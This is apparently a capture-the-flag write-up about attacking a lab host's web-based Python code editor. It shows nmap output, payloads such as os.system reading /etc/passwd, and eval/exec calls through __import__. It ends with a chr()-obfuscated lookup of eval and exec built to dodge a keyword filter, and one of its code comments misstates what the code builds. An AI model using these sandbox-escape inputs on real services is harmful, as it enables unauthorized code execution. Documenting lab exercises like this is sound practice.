The first thing IP Address: 10.129.36.102

NMAP Enumeration:

```
└──╼ [★]$ nmap -A -sC -sV  10.129.36.102
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 05:50 CDT
Nmap scan report for 10.129.36.102
Host is up (0.0092s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT     ADDRESS
1   8.91 ms 10.10.14.1
2   9.15 ms 10.129.36.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.58 seconds

```

From the enumeration, there is a 5000 port opened, which is http protocol. While opening it, there is a python interpreter. 

See the Figure 1:
![](image.png)

Python Version: ``` 3.8.10 ``` 
More information: https://www.vicarius.io/vsociety/posts/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-4

By trying this, there is no such run, which give us an answer. 

There is another function, called globals()
Let's see: 
in Python, the globals() function is a built-in function that returns a dictionary representing the current global symbol table. A symbol table is a data structure that contains all necessary information about the program. These include variable names, methods, classes. 

See the Figure 2:
![](image-1.png)

There are useful for pentester functions: eval(), exec(). 
For example, we can use next:

If there's an interactive Python environment or a way to inject Python code (such as via input fields or HTTP requests), you could try:

import os
os.system("cat /etc/passwd")

eval("__import__('os').system('ls -la')")

exec("__import__('subprocess').getoutput('id')")

For trying it, we have some same answer fetched by the python interpreter:

See the Figure 3:
![alt text](image-2.png)

See the Figure 4:
![alt text](image-3.png)

So, lets see Figure 5:
![alt text](image-4.png)

There is something I have  got with obfuscation:

```

built_name = ''.join([chr(95), chr(95), chr(98), chr(117), chr(105), chr(108), chr(116), chr(105), chr(110), chr(115), chr(95), chr(95)]) 
built_ref = globals().get(built_name, None) 

ev_name = ''.join([chr(101), chr(118), chr(97), chr(108)])  #
ex_name = ''.join([chr(101), chr(120), chr(101), chr(99)])  #'


ev_func = built_ref.get(ev_name, None)
ex_func = built_ref.get(ex_name, None)   


if ev_func:
    expression = ''.join([str(50), ' + ', str(51)])  # This builds '2 + 3'
    result = ev_func(expression)
    print("Obfuscated Result of ev:", result)
else:
    print("ev function not found!")
if ex_func:
    code = ''.join([
        'result = ',  
        str(50), ' + ', str(51)  
    ])  
    ex_func(code)
    print("Ob Result of ex:", result)
else:
    print("ex function not found!")
```

Interpreter Answer:
```
Obfuscated Result of ev: 101 Ob Result of ex: 101  
```